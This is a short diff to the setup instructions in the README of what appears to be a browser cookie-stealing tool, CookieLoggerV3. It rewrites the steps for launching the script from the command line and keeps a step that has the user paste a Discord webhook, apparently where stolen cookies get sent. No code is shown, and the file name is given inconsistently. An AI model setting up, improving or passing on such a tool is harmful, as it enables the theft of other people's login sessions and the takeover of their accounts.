@@ -29,9 +29,9 @@ step 0; if you dont have python3 installed go to https://www.python.org/download
 
 Step 1; Download Zip and extract
 
-Step 2; Run the requirements file and wait until it finishes and installs all requirements
+Step 2; Go To CMD cd to the directory where you saved CookieLoggerV3.py the run: python3 CookieLogger.py
 
-Step 3; run the CookieLoggerV3.py file and wait until the gui opens
+Step 3; Wait For gui to load
 
 Step 4; get your discord webhook and put it in the box that says WEBHOOK_HERE
 
